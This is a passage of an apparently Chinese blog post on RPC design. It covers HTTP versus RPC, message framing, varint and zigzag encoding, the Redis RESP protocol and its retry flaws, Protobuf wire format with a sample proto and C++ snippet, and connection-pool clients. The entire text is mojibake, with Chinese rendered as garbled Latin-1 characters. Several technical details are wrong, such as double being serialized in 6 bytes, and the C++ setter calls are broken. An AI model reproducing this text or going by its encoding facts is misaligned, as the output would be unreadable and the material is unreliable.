çš„äºŒè¿›åˆ¶åè®®è¿›è¡Œé€šè®¯ã€‚ TensorFlow ä¸ RPC å½“å¤šä¸ªåˆ†å¸ƒå¼èŠ‚ç‚¹éœ€è¦é›†ç¾¤è®¡ç®—æ—¶ï¼Œå°±å¿…é¡»å¼•å…¥ RPC æŠ€æœ¯è¿›è¡Œé€šè®¯ã€‚Tensorflow Cluster çš„ RPC é€šè®¯æ¡†æ¶ä½¿ç”¨äº† Google å†…éƒ¨è‡ªç ”çš„ gRPC æ¡†æ¶ã€‚ åŸºäºSocketçš„RPCå’ŒåŸºäºHTTPçš„RPC åŸºäºSocketçš„RPCæ€§èƒ½å¯ä»¥è¾¾åˆ°åŸºäºHTTPçš„RPCçš„ 4 åˆ° 10 å€ã€‚ HTTP VS RPC HTTP è°ƒç”¨å…¶å®ä¹Ÿæ˜¯ä¸€ç§ç‰¹æ®Šçš„ RPCã€‚ HTTP1.0 åè®®æ—¶ï¼ŒHTTP è°ƒç”¨è¿˜åªèƒ½æ˜¯çŸ­é“¾æ¥è°ƒç”¨ï¼Œä¸€ä¸ªè¯·æ±‚æ¥å›ä¹‹åè¿æ¥å°±ä¼šå…³é—­ã€‚HTTP1.1 å¼•å…¥äº† KeepAlive ç‰¹æ€§å¯ä»¥ä¿æŒ HTTP è¿æ¥é•¿æ—¶é—´ä¸æ–­å¼€ï¼Œä»¥ä¾¿åœ¨åŒä¸€ä¸ªè¿æ¥ä¹‹ä¸Šè¿›è¡Œå¤šæ¬¡è¿ç»­çš„è¯·æ±‚ï¼Œè¿›ä¸€æ­¥æ‹‰è¿‘äº† HTTP å’Œ RPC ä¹‹é—´çš„è·ç¦»ã€‚ HTTP2.0 ä¹‹åï¼ŒGoogle å¼€æºäº†ä¸€ä¸ªå»ºç«‹åœ¨ HTTP2.0 åè®®ä¹‹ä¸Šçš„é€šä¿¡æ¡†æ¶ç›´æ¥å–åä¸º gRPCï¼Œä¹Ÿå°±æ˜¯ Google RPCã€‚ HTTP APIè™½ç„¶æ•ˆç‡ä¸é«˜ï¼Œä½†æ˜¯é€šç”¨ï¼Œæ²¡æœ‰å¤ªå¤šæ²Ÿé€šçš„å­¦ä¹ æˆæœ¬ã€‚ RPC æ›´åŠ é«˜æ•ˆï¼Œç»è¿‡å¯¹åº”çš„è®¾è®¡ï¼Œè¿›è¡Œé«˜æ•ˆç‡çš„äº¤æµï¼Œè¦æ¯”é€šç”¨çš„ HTTP åè®®æ¥äº¤æµæ›´åŠ èŠ‚çœèµ„æºã€‚æ¯”å¦‚ å¼€æº RPC åè®®ä¸­ Protobuf å’Œ Thrift å°±æ˜¯æ–¹è¨€ä¸­çš„ä¸¤ç§ã€‚ è¿è¡Œåœ¨åŒä¸€ä¸ªæ“ä½œç³»ç»Ÿå®çš„ä¸¤ä¸ªè¿›ç¨‹é€šä¿¡æ—¶ï¼Œè¿˜æœ‰å…±äº«å†…å­˜ã€ä¿¡å·é‡ã€æ–‡ä»¶ç³»ç»Ÿã€å†…æ ¸æ¶ˆæ¯é˜Ÿåˆ—ã€ç®¡é“ç­‰ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯é€šè¿‡æ“ä½œç³»ç»Ÿå†…æ ¸æœºåˆ¶æ¥è¿›è¡Œæ•°æ®å’Œæ¶ˆæ¯çš„äº¤äº’ã€‚ä½†åœ¨ç°ä»£ä¼ä¸šæœåŠ¡ä¸­ï¼Œè¿™ç§å•æœºåº”ç”¨å·²ç»éå¸¸å°‘è§äº†ã€‚ å¼€æºèµ„æºä¸èµ„æ–™ Remote procedure call - Wikipedia gRPC - Wikipedia Home Â· hprose/hprose Wiki (github.com) Home Â· baidu/sofa-pbrpc Wiki (github.com) buttonrpc RPCäº¤äº’è¿‡ç¨‹ æ¶ˆæ¯åè®®è®¾è®¡ é¦–å…ˆï¼Œéœ€è¦åŒºåˆ†æ¯ä¸ªç‹¬ç«‹çš„æ¶ˆæ¯æ•°æ®ï¼Œè€ƒè™‘æ¶ˆæ¯æ•°æ®å¦‚ä½•ç»„ç»‡è¡¨ç¤ºï¼Œå¦‚ä½•è®¾è®¡æ¶ˆæ¯æ•°æ®çš„æ ¼å¼ã€‚ è¾¹ç•Œ RPC éœ€è¦åœ¨ä¸€æ¡ TCP é“¾æ¥ä¸Šè¿›è¡Œå¤šæ¬¡æ¶ˆæ¯ä¼ é€’ã€‚ç½‘ç»œåè®®ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½å­˜åœ¨æ‹†åŒ…ã€ç²˜åŒ…é—®é¢˜ã€‚éœ€è¦è®¾è®¡è¾¹ç•ŒåŒºåˆ†æ–¹æ³•ã€‚ æ¯”å¦‚ï¼Œä½¿ç”¨ç‰¹æ®Šç¬¦å·åˆ†å‰²ä¸åŒæ¶ˆæ¯ï¼ˆ\\r\\nï¼‰ï¼ˆå¸¸ç”¨äºæ–‡æœ¬æ ¼å¼æ¶ˆæ¯ï¼‰ï¼Œæˆ–è€…ç›´æ¥åœ¨æ¶ˆæ¯ä¸­é™„åŠ æ¶ˆæ¯æ•°æ®é•¿åº¦ä¿¡æ¯ï¼ˆå¸¸ç”¨äºäºŒè¿›åˆ¶æ¶ˆæ¯ï¼‰ã€‚ ç»“æ„ æ˜¾ç¤ºç»“æ„ json æ˜¯ä¸€ç§æ˜¾å¼ç»“æ„çš„æ¶ˆæ¯åè®®ã€‚å¯è¯»æ€§å¥½ï¼Œä½†æ˜¯å†—ä½™ä¿¡æ¯å¤šã€‚ å…¶ä¸­æ ‡å‡†æ ¼å¼ä½¿ç”¨å¾ˆå¤šæ ‡è®°ç¬¦å· \"ã€:ã€{} ç­‰ã€‚è¿ç»­çš„å¤šæ¡ json æ¶ˆæ¯å³ä½¿ç»“æ„å®Œå…¨ä¸€æ ·ï¼Œä»…ä»…åªæ˜¯ value çš„å€¼ä¸ä¸€æ ·ï¼Œä¹Ÿéœ€è¦å‘é€åŒæ ·çš„ key å­—ç¬¦ä¸²ä¿¡æ¯ã€‚ ä¸€ç§ä¼˜åŒ–æ–¹æ³•ï¼šRPCå»ºç«‹è¿æ¥æ—¶ï¼Œå°±ç¡®å®šæ¶ˆæ¯çš„ç»“æ„ï¼Œä¹‹ååªéœ€è¦æ ¹æ®ç»“æ„å‘é€ value å€¼ï¼Œè‡ªåŠ¨å’Œ key ç›¸å¯¹åº”ã€‚æ¯”å¦‚ï¼ŒHadoopçš„ avro åè®®ã€‚ éšå¼ç»“æ„ ç»“æ„ä¿¡æ¯ç”±ä»£ç æ¥çº¦å®šçš„æ¶ˆæ¯åè®®ã€‚åœ¨ RPC äº¤äº’çš„æ¶ˆæ¯æ•°æ®ä¸­åªæ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œç”±ä»£ç æ¥ç¡®å®šç›¸åº”ä½ç½®çš„äºŒè¿›åˆ¶æ˜¯å±äºå“ªä¸ªå­—æ®µã€‚ éšå¼æ¶ˆæ¯çš„ä¼˜ç‚¹å°±åœ¨äºèŠ‚çœä¼ è¾“æµé‡ï¼Œä¸éœ€è¦ä¼ è¾“ç»“æ„ä¿¡æ¯ã€‚ å‹ç¼© å¯¹æ¶ˆæ¯è¿›è¡Œå‹ç¼©å¤„ç†ï¼Œå¯ä»¥å‡è½»ç½‘ç»œå¸¦å®½å‹åŠ›ï¼Œä½†ä¹Ÿä¼šåŠ é‡ CPU çš„è´Ÿæ‹…ã€‚ æ¯”å¦‚ Google çš„ snappy ç®—æ³•ï¼Œè¿è¡Œæ€§èƒ½éå¸¸å¥½ï¼Œå‹ç¼©æ¯”ä¾‹æ¥è¿‘æœ€ä¼˜ã€‚é˜¿é‡Œçš„ SOFA RPC å°±ä½¿ç”¨äº† snappy ä½œä¸ºåè®®å±‚å‹ç¼©ç®—æ³•ã€‚ å‹ç¼©ç›¸å…³ä¼˜åŒ– ä½¿ç”¨å˜é•¿ varint è¡¨ç¤ºæ•´æ•°ï¼Œæœ€é«˜bitä½ä¸å†è¡¨ç¤ºç¬¦å·ï¼Œè€Œæ˜¯ä¸‹ä¸€ä¸ªbyteæ˜¯å¦å’Œå½“å‰byteæ˜¯åŒä¸€ä¸ªintçš„ä¸€éƒ¨åˆ†ã€‚ å¯¹è´Ÿæ•°ï¼Œä½¿ç”¨zigzagç¼–ç ï¼Œå°±æ˜¯å°† 0 æ˜ å°„åˆ° 0ï¼Œ-1 æ˜ å°„åˆ° 1ï¼Œ1 æ˜ å°„åˆ° 2ï¼Œ-2 æ˜ å°„åˆ° 3... å°†è´Ÿæ•°ç¼–ç æˆæ­£å¥‡æ•°ï¼Œæ­£æ•°ç¼–ç æˆå¶æ•°ã€‚è§£ç çš„æ—¶å€™é‡åˆ°å¶æ•°ç›´æ¥é™¤ 2 å°±æ˜¯åŸå€¼ï¼Œé‡åˆ°å¥‡æ•°å°±åŠ  1 é™¤ 2 å†å–è´Ÿå°±æ˜¯åŸå€¼ã€‚ åè®®ä¾‹å­ Redis æ–‡æœ¬åè®® Redis è®¾è®¡äº†ä¸€å¥—ä¸“ç”¨çš„æ–‡æœ¬é€šè®¯åè®® RESPã€‚Redisè®¾è®¡è€…è®¤ä¸ºæ•°æ®åº“ç³»ç»Ÿçš„ç“¶é¢ˆä¸€èˆ¬ä¸åœ¨äºç½‘ç»œæµé‡ï¼Œè€Œæ˜¯æ•°æ®åº“è‡ªèº«å†…éƒ¨é€»è¾‘å¤„ç†ä¸Šã€‚æ‰€ä»¥ä½¿ç”¨æµªè´¹æµé‡çš„æ–‡æœ¬åè®®ï¼Œä¾ç„¶å¯ä»¥å–å¾—æé«˜çš„è®¿é—®æ€§èƒ½ã€‚ Redis å°†æ‰€æœ‰æ•°æ®éƒ½æ”¾åœ¨å†…å­˜ï¼Œç”¨ä¸€ä¸ªå•çº¿ç¨‹å¯¹å¤–æä¾›æœåŠ¡ï¼Œå•ä¸ªèŠ‚ç‚¹è·‘æ»¡ä¸€ä¸ª CPU æ ¸å¿ƒæ—¶å¯ä»¥è¾¾åˆ°äº† 10w/s çš„ QPSã€‚ RESP(Redis Serialization Protocol) åè®®è®¾è®¡ä¸ºï¼š å•è¡Œå­—ç¬¦ä¸² ä»¥ + ç¬¦å·å¼€å¤´ï¼› å¤šè¡Œå­—ç¬¦ä¸² ä»¥ $ ç¬¦å·å¼€å¤´ï¼Œåè·Ÿå­—ç¬¦ä¸²é•¿åº¦ï¼› æ•´æ•°å€¼ ä»¥ : ç¬¦å·å¼€å¤´ï¼Œåè·Ÿæ•´æ•°çš„å­—ç¬¦ä¸²å½¢å¼ï¼› é”™è¯¯æ¶ˆæ¯ ä»¥ - ç¬¦å·å¼€å¤´ï¼› æ•°ç»„ ä»¥ * å·å¼€å¤´ï¼Œåè·Ÿæ•°ç»„çš„é•¿åº¦ï¼› å•å…ƒç»“æŸæ—¶ç»Ÿä¸€åŠ ä¸Šå›è½¦æ¢è¡Œç¬¦å·\\r\\nã€‚ å¦å¤–ï¼ŒNULL è¡¨ç¤ºä¸º $-1ï¼Œç©ºä¸² è¡¨ç¤ºä¸º $0ï¼Œä¸¤ä¸ª\\r\\n ä¹‹é—´éš”çš„æ˜¯ç©ºä¸²ã€‚ ç¤ºä¾‹ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ set æŒ‡ä»¤set author codeholeï¼š 1*3\\r\\n$3\\r\\nset\\r\\n$6\\r\\nauthor\\r\\n$8\\r\\ncodehole\\r\\n æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å›å¤çš„å“åº”è¦æ”¯æŒå¤šç§æ•°æ®ç»“æ„ã€‚æ¯”å¦‚ OK å“åº”ï¼š 1+OK é”™è¯¯å“åº”ï¼š 1-ERR ... æ•´æ•°å“åº”ï¼š 1:1 æ•°ç»„å“åº”ï¼Œè¿™é‡Œå°†hashè¡¨çš„keyå’Œvalueä½œä¸ºæ•°ç»„ä¼ é€’ï¼š 1*6\\r\\n$4\\r\\nname\\r\\n$6\\r\\nxxx\\r\\n$3\\r\\nage\\r\\n$2\\r\\n30\\r\\n Redisåè®®çš„ç¼ºé™· é¦–å…ˆï¼ŒRPC æ˜¯å»ºç«‹åœ¨ TCP åè®®åŸºç¡€ä¸Šè¿›è¡Œæ¶ˆæ¯ä¼ é€’ï¼Œè€Œ TCP è¿æ¥å¹¶ä¸æ€»æ˜¯ç¨³å®šçš„ã€‚å¦‚æœå› ä¸ºæŸäº›åŸå› æ–­å¼€è¿æ¥ï¼Œå®¢æˆ·ç«¯éœ€è¦åˆ¤æ–­æœåŠ¡å™¨æ˜¯å¦å·²ç»å¤„ç†äº†æ¶ˆæ¯è¿˜æ˜¯æ ¹æœ¬å°±æ²¡æ”¶åˆ°ï¼Œæ²¡æ”¶åˆ°çš„è¯å°±éœ€è¦é‡æ–°å‘é€è¯·æ±‚ã€‚å¦‚æœæœåŠ¡å™¨å·²ç»åœ¨å¤„ç†è¯·æ±‚äº†ï¼Œå†é‡å‘å°±ä¼šé‡å¤æ‰§è¡Œè¯·æ±‚ï¼Œé€ æˆæ— æ•ˆçš„æœåŠ¡å™¨è´Ÿè½½ã€‚ ä¸€ç§æ–¹æ³•ï¼Œæ˜¯ç»™æ¯ä¸ªè¯·æ±‚ä¸€ä¸ªå…¨å±€å”¯ä¸€IDï¼ŒæœåŠ¡å™¨è´Ÿè´£åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œå°†IDå’Œå¤„ç†ç»“æœç¼“å­˜ã€‚å¦‚æœæ”¶åˆ°é‡å¤è¯·æ±‚ï¼Œå°±ç›´æ¥è¿”å›ç¼“å­˜ç»“æœã€‚ Rediså¹¶æ²¡æœ‰é‡‡ç”¨ä»¥ä¸Šæ–¹æ³•ã€‚Redisçš„æ–¹æ³•æ˜¾å¾—éšæ„ã€‚ Redisåªæ˜¯æä¾›retry_on_timeouté€‰é¡¹æ¥è®©ç”¨æˆ·è‡ªå·±å†³å®šè¦ä¸è¦åœ¨TimeoutErroræ—¶è¿›è¡Œé‡è¯•ï¼Œè€Œä¸ç®¡æ˜¯å¦å‡ºç°é‡å¤è¯·æ±‚ã€‚ ç¨å¾®åˆ†æredisç»™å‡ºçš„ä¸¤ç§é”™è¯¯ï¼Œå°±ä¼šå‘ç°redisåœ¨å¤„ç†é€»è¾‘ä¸Šç¼ºé™·ã€‚ å¯¹äºConnectionErrorï¼ŒæŒ‡åœ¨å»ºç«‹è¿æ¥æ—¶å°±å‡ºäº†é”™ï¼Œç›´æ¥è¿›è¡Œé‡æ–°è¯·æ±‚ã€‚ å¯¹äºTimeoutErrorï¼Œåˆ†ä¸ºè¯»è¶…æ—¶ï¼Œå†™è¶…æ—¶ã€‚ å†™è¶…æ—¶ å†™è¶…æ—¶æ˜¯æŒ‡å†…æ ¸ä¸ºå½“å‰å¥—æ¥å­—å¼€è¾Ÿçš„å†™ç¼“å­˜ç©ºé—´å·²ç»æ»¡äº†ï¼Œä¸‰ç§æƒ…å†µå¯¼è‡´clientç¼“å†²åŒºè£…æ»¡ï¼š clientå†™æ–¹çš„æ¶ˆæ¯å› ä¸ºç½‘ç»œåŸå› è¿Ÿè¿Ÿè¾¾åˆ°ä¸äº†è¯»æ–¹ã€‚æ— æ³•ç¡®å®šæ˜¯å¦serveråœ¨æœªæ¥ä¼šæ”¶åˆ°ï¼Œä¸å¯éšæ„é‡è¯•ï¼› serverè€æ˜¯ä¸è¯»æ¶ˆæ¯ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ—¶ç»™ client å‘é€ ackã€‚æ— æ³•ç¡®å®šæ˜¯å¦serveråœ¨æœªæ¥ä¼šå¤„ç†ï¼Œä¸å¯éšæ„é‡è¯•ï¼› clientå› ä¸ºç½‘ç»œåŸå› æ²¡æœ‰æ”¶åˆ° ackã€‚ç”±äºserverå·²ç»å¤„ç†äº†è¯·æ±‚ï¼Œå†é‡å‘è¯·æ±‚ä¼šé‡å¤å¤„ç†è¯·æ±‚ã€‚ä¸”å¯èƒ½å†æ¬¡å‡ºç°ackåŒ…ä¸¢å¤±ã€‚ è¯»è¶…æ—¶ è¯»è¶…æ—¶æ˜¯æŒ‡å‘é€å®Œè¯·æ±‚ï¼Œrecvè¿Ÿè¿Ÿæ”¶ä¸åˆ°å“åº”ï¼Œæˆ–è€…åªæ”¶åˆ°éƒ¨åˆ†å“åº”æ¶ˆæ¯ã€‚rediså¹¶æ²¡æœ‰è¿›è¡Œå¤„ç†è¯·æ±‚æ˜¯å¦é€è¾¾çš„é€»è¾‘ã€‚æ‰€ä»¥ä¸èƒ½ç¡®å®šæ˜¯å¦æœ‰å¿…è¦é‡è¯•ã€‚ Protobuf äºŒè¿›åˆ¶åè®® Protobuf æä¾›äº†ä¸€ç§æè¿°é€šè®¯åè®®çš„æ¥å£æè¿°è¯­è¨€ IDLï¼Œé€šè¿‡ç¼–å†™æ¥å£åè®®ï¼ŒProtobuf å¯ä»¥è‡ªåŠ¨ç”Ÿæˆå¤šç§è¯­è¨€çš„ RPC é€šè®¯ä»£ç ã€‚ Protobuf æ¶ˆæ¯è¢«è½¬åŒ–ä¸ºäºŒè¿›åˆ¶çš„ key - value ã€‚key ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œtagï¼ˆé»˜è®¤4bitsï¼‰å…¶å€¼å¯¹åº” .proto ä»£ç ä¸­ message æ¶ˆæ¯ä½“ä¸­å­—æ®µç¼–å·ï¼›typeï¼ˆ3bitsï¼‰å…¶å€¼å¯¹åº”8ç§å‚æ•°ç±»å‹ã€‚å½“ message æ¶ˆæ¯ä½“ä¸­å­—æ®µæ•°è¶…è¿‡ 16ï¼Œvarintç¼–ç ä¹Ÿå¯ä»¥å¤„ç†ï¼Œåªéœ€å¢åŠ ä¸€ä¸ªbyteã€‚ 1| 1 | tag(7 high bits) | 0 | tag(4 low bits) | type(3 bits) | æœ€é«˜ä½çš„ 0 å’Œ 1 ï¼Œæ ‡å¿—ç€ä¸‹ä¸€ä¸ªbyteæ˜¯å¦å’Œå½“å‰byteå…±åŒè¡¨ç¤ºä¸€ä¸ªå€¼ã€‚ type æ•°å€¼ Protobuf çš„æ•´æ•°æ•°å€¼ä½¿ç”¨ zigzag ç¼–ç ã€‚æµ®ç‚¹æ•° float å’Œ doubleï¼Œåˆ†åˆ«ä½¿ç”¨ 4 ä¸ªå­—èŠ‚å’Œ 6 ä¸ªå­—èŠ‚åºåˆ—åŒ–ï¼Œæ²¡æœ‰ç‰¹æ®Šå¤„ç†ã€‚ zigzagï¼šå¯¹è´Ÿæ•°ï¼Œä½¿ç”¨zigzagç¼–ç ï¼Œå°±æ˜¯å°† 0 æ˜ å°„åˆ° 0ï¼Œ-1 æ˜ å°„åˆ° 1ï¼Œ1 æ˜ å°„åˆ° 2ï¼Œ-2 æ˜ å°„åˆ° 3... å°†è´Ÿæ•°ç¼–ç æˆæ­£å¥‡æ•°ï¼Œæ­£æ•°ç¼–ç æˆå¶æ•°ã€‚è§£ç çš„æ—¶å€™é‡åˆ°å¶æ•°ç›´æ¥é™¤ 2 å°±æ˜¯åŸå€¼ï¼Œé‡åˆ°å¥‡æ•°å°±åŠ  1 é™¤ 2 å†å–è´Ÿå°±æ˜¯åŸå€¼ã€‚ å­—ç¬¦ä¸² å­—ç¬¦ä¸²å€¼ä½¿ç”¨é•¿åº¦å‰ç¼€ç¼–ç  (length-delimited) ã€‚ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆvarintï¼‰ï¼Œåé¢ç›¸åº”é•¿åº¦çš„å­—èŠ‚ä¸²å°±æ˜¯å­—ç¬¦ä¸²çš„å†…å®¹ã€‚ å¯é€‰é€‰é¡¹ï¼ˆoptionalï¼‰ äºŒè¿›åˆ¶æµé‡Œé¢å¯æ²¡æœ‰ä½¿ç”¨ä»»ä½•æ ‡å¿—ä¸ºæ¥è¡¨ç¤ºå­—æ®µæ˜¯å¦å¯é€‰ï¼Œåªæ˜¯åœ¨è¿è¡Œæ—¶åšäº†æ£€æŸ¥ã€‚3.0ä¹‹å‰ï¼Œè®¾ç½® required é€‰é¡¹å¯ä»¥å¼ºåˆ¶æ£€æŸ¥æ˜¯å¦å¡«å†™æŸå­—æ®µï¼Œå¹¶æŠ›å‡ºå¼‚å¸¸ã€‚ä½†3.0ä¹‹åï¼Œæ‰€æœ‰ç±»å‹éƒ½å˜æˆäº† optionalï¼Œç§»é™¤äº† requiredã€‚ åˆ—è¡¨ï¼ˆrepeatedï¼‰ åœ¨æ¶ˆæ¯ä½“ä¸­ï¼Œé‡å¤å½“å‰ keyï¼Œå¾—åˆ°ä¸åŒ value çš„åˆ—è¡¨ã€‚ ç¤ºä¾‹ å®šä¹‰ proto æ–‡ä»¶ 12345678syntax &#x3D; &quot;proto2&quot;;package ppack;message Person &#123; required string user_name &#x3D; 1; &#x2F;&#x2F; å¿…é¡»å­—æ®µ optional int64 id_number &#x3D; 2; &#x2F;&#x2F; å¯é€‰å­—æ®µ repeated string interests &#x3D; 3; &#x2F;&#x2F; åˆ—è¡¨ç±»å‹&#125; protoc ç¼–è¯‘ä¹‹åï¼Œåœ¨cppä¸­ä½¿ç”¨ï¼š 12345678#include \"ppack.pb.h\"... ppack::Person pp; pp.set_user_name = \"allen\"; pp.set_id_number = 1337; pp.set_interests(0, \"daydreaming\"); pp.set_interests(1, \"hacking\");... å…¶äºŒè¿›åˆ¶è¡¨ç¤ºå¦‚ä¸‹å›¾ï¼š Protobufä¼ é€’æ¶ˆæ¯ï¼Œè¿˜éœ€è¦é€šè¿‡æ¶ˆæ¯å¤´çš„Lengthå­—æ®µç¡®å®šæ¶ˆæ¯è¾¹ç•Œï¼ŒåŒæ—¶ä¼ é€’æ¶ˆæ¯è§£æéœ€è¦çš„ message æ¶ˆæ¯ç±»å‹å®šä¹‰ã€‚å®Œæ•´æ¶ˆæ¯ä½“å¦‚ä¸‹å›¾ï¼š RPC å®¢æˆ·ç«¯ å®ç° RPC å®¢æˆ·ç«¯æ ¸å¿ƒéš¾ç‚¹åœ¨äºå®¢æˆ·ç«¯å¾€å¾€å¹¶ä¸æ˜¯å•çº¿ç¨‹çš„ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘å¤šçº¿ç¨‹ä¸‹å¦‚ä½•æµç•…ä½¿ç”¨å®¢æˆ·ç«¯è€Œä¸å‡ºç°å¹¶å‘é—®é¢˜ã€‚ å®¢æˆ·ç«¯å’Œæ•°æ®åº“ä¹‹é—´ä¼šç»´æŠ¤ä¸€ä¸ªè¿æ¥æ± ï¼Œå¹¶ä¸¥æ ¼æ§åˆ¶æœ‰æ•ˆè¿æ¥çš„æ•°é‡ã€‚ é” æ¯ä¸ªçº¿ç¨‹éƒ½ä¼šè®¿é—®çº¿ç¨‹æ± å¯¹è±¡ï¼Œä½¿ç”¨é”æ¥æ§åˆ¶æ•°æ®ç»“æ„çš„å®‰å…¨ã€‚ è€ƒè™‘åˆ°è¿æ¥éƒ½æ˜¯ç”¨æ¥è¿›è¡Œç›¸å¯¹ç¼“æ…¢çš„ IO æ“ä½œï¼Œé”çš„è€—æ—¶ç›¸æ¯” IO æ“ä½œè€—æ—¶å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚æ‰€ä»¥ï¼Œåœ¨æ€§èƒ½è®¸å¯çš„å‰æä¸‹ï¼Œå¯ä»¥ä¸ºäº†ä»£ç çš„ç®€æ´æ€§ï¼Œè®¾è®¡ç²—ç²’åº¦çš„é”ã€‚ æƒ°æ€§è¿æ¥ å¦‚æœä¸€ä¸ªç³»ç»Ÿéå¸¸é—²ç½®ï¼Œè€Œæå‰å¼€è¾Ÿäº†å¤ªå¤šçš„è¿æ¥æ± é‚£æ˜¯å¯¹èµ„æºçš„æµªè´¹ã€‚ä½¿ç”¨æƒ°æ€§è¿æ¥ï¼Œåœ¨éœ€è¦çš„æ—¶å€™æ‰ä¼šå»å‘æ•°æ®åº“ç”³è¯·æ–°çš„è¿æ¥ã€‚ æƒ°æ€§è¿æ¥çš„é—®é¢˜ï¼Œä¹Ÿæ˜¯å†·å¯åŠ¨å¸¸è§çš„é—®é¢˜ï¼š å¦‚æœæ•°æ®åº“è¿æ¥å‚æ•°ä¸æ­£ç¡®ï¼Œéœ€è¦åœ¨æ”¶åˆ°ç”¨æˆ·çš„è¯·æ±‚è¿›è¡Œæ˜¾ç¤ºçš„æ•°æ®è®¿é—®æ—¶æ‰èƒ½å‘ç°ã€‚ æœåŠ¡å™¨éœ€è¦çƒ­èº«ï¼Œæ—©æ¥çš„è¯·æ±‚éœ€è¦é¢å¤–ä»˜å‡ºä¸€æ¬¡å»ºç«‹è¿æ¥çš„ä»£ä»·ã€‚ è¿æ¥å¥åº·æ£€æŸ¥ è¿æ¥æ± ä¸­ç®¡ç†çš„è¿æ¥å¯èƒ½ä¼šå› ä¸ºç½‘ç»œåŸå› è€ŒæŸåæ–­è¿ã€‚è¿æ¥æ± éœ€è¦ä¿æŒå†…éƒ¨ç®¡ç†çš„è¿æ¥æ˜¯å¯ç”¨çš„ã€‚å¸¸è§æ£€æŸ¥æ—¶æœºæ˜¯ï¼š çº¿ç¨‹ä»è¿æ¥æ± ä¸­ç”³è¯·è¿æ¥ï¼Œåœ¨è¿”å›è¿æ¥ä¹‹å‰è¿›è¡Œæ£€æŸ¥ï¼› çº¿ç¨‹å°†è¿æ¥å½’è¿˜ç»™è¿æ¥æ± æ—¶ï¼Œå¯¹è¿æ¥è¿›è¡Œæ£€æŸ¥ï¼› çº¿ç¨‹æ± å®šæ—¶å¯¹è¿æ¥è¿›è¡Œæ£€æŸ¥ã€‚ å¸¸è§æ£€æŸ¥æ–¹æ³•ï¼š ping å¿ƒè·³æ£€æŸ¥ å¤„ç†é—®é¢˜è¿æ¥ï¼š æŠ›å¼ƒè¿æ¥ï¼Œè¿æ¥æ± çš„è¿æ¥æ•°é‡å‡ä¸€ï¼Œå¿…è¦æ—¶ï¼Œé‡æ–°ç”³è¯·ä¸€ä¸ªè¿æ¥ï¼› é‡è¿å½“å‰è¿æ¥ã€‚ å¿ƒè·³æ£€æµ‹ å½“å®¢æˆ·ç«¯é•¿æœŸç©ºé—²æ—¶ï¼ŒæœåŠ¡å™¨å¾€å¾€ä¼šè‡ªåŠ¨å…³é—­è¿æ¥å·²å‡è½»èµ„æºæ¶ˆè€—ã€‚ å½“å®¢æˆ·ç«¯å†æ¬¡è¯·æ±‚æ—¶ï¼Œå°±ä¼šé‡åˆ°è¿æ¥å·²æ–­å¼€çš„é”™è¯¯ã€‚ä¸ºäº†é¿å…è¿™ç§é”™è¯¯ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼š é‡åˆ°è¿æ¥é”™è¯¯æ—¶è¿›è¡Œé‡è¿é‡è¯•ï¼› é€šè¿‡å¿ƒè·³æ–¹å¼å‘ŠçŸ¥æœåŠ¡å™¨ä¸è¦å…³é—­è¿æ¥ï¼Œæ¯é—´éš”ä¸€å®šæ—¶é—´å‘é€å¿ƒè·³æ£€æµ‹åŒ…ï¼Œå¹¶ç¡®è®¤æœåŠ¡ç«¯å“åº”ã€‚ å¤„ç†è¶…æ—¶ å½“è¿æ¥æ± å†…è¿æ¥ä¸å¤Ÿç”¨ï¼Œé€ æˆçº¿ç¨‹ç­‰å¾…ç©ºé—²è¿æ¥ï¼Œäº§ç”Ÿè¶…æ—¶ã€‚å¤„ç†æ–¹æ³•ä¸€èˆ¬æœ‰ä¸‰ç§ï¼š æ°¸ä¸è¶…æ—¶ï¼Œç­‰ä¸åˆ°å°±æ¥ç€ç­‰ï¼Œä¸æ˜¯ä¸€ç§å¥½çš„é€‰æ‹©ã€‚ è®¾å®šè¶…æ—¶æ—¶é™ï¼Œè¶…æ—¶åï¼Œå°±å‘å¤–éƒ¨è·‘å‡ºè¶…æ—¶å¼‚å¸¸ï¼Œä¸­æ–­ä¸šåŠ¡é€»è¾‘ã€‚ ç”³è¯·ä¸€ä¸ªæ–°çš„è¿æ¥ç»™è°ƒç”¨æ–¹ã€‚å½’è¿˜è¿æ¥çš„æ—¶å€™ï¼Œè‹¥è¿æ¥æ± ä¸æ»¡å°±çº³å…¥è¿æ¥æ± ï¼Œè‹¥è¿æ¥æ± æ»¡äº†ï¼Œå°±ç›´æ¥é”€æ¯ã€‚ æ€§èƒ½ç›‘æ§ å¯¹å®¢æˆ·ç«¯è¿æ¥æ± è¿›è¡Œæ‰§è¡Œæ—¶é—´ç­‰ä¿¡æ¯ç›‘æ§ï¼Œå¹¶æä¾›ç›‘å¬æ¥å£ï¼Œæ–¹ä¾¿è¾“å‡ºç›‘æ§ç»Ÿè®¡ä¿¡æ¯ã€‚ è¿æ¥å¤šè·¯å¤ç”¨ (multiplexing) ä¼ ç»Ÿçš„ RPC å®¢æˆ·ç«¯ï¼ŒåŒä¸€ä¸ªè¿æ¥ä¸Šè¿ç»­çš„ä¸¤ä¸ªè¯·æ±‚å¿…é¡»æŒ‰å…ˆåé¡ºåºæ’é˜Ÿè·å–ç»“æœã€‚å¤šè·¯å¤ç”¨çš„ RPCå®¢æˆ·ç«¯ï¼ŒåŒä¸€ä¸ªé“¾æ¥ä¸Šå¯ä»¥åŒæ—¶è¿›è¡Œå¤šä¸ªè¯·æ±‚ï¼Œå¹¶ä¸”å¯ä»¥ä¹±åºæ‰§è¡Œã€‚ HTTP2.0 å°±å…·å¤‡äº†å¤šè·¯å¤ç”¨çš„è¿æ¥ï¼Œ gRPC æ­£æ˜¯åŸºäº HTTP2.0 çš„å¤šè·¯å¤ç”¨çš„è¿æ¥å°è£…çš„ä¸€æ¬¾é«˜æ€§èƒ½ RPC æ¡†æ¶ã€‚ 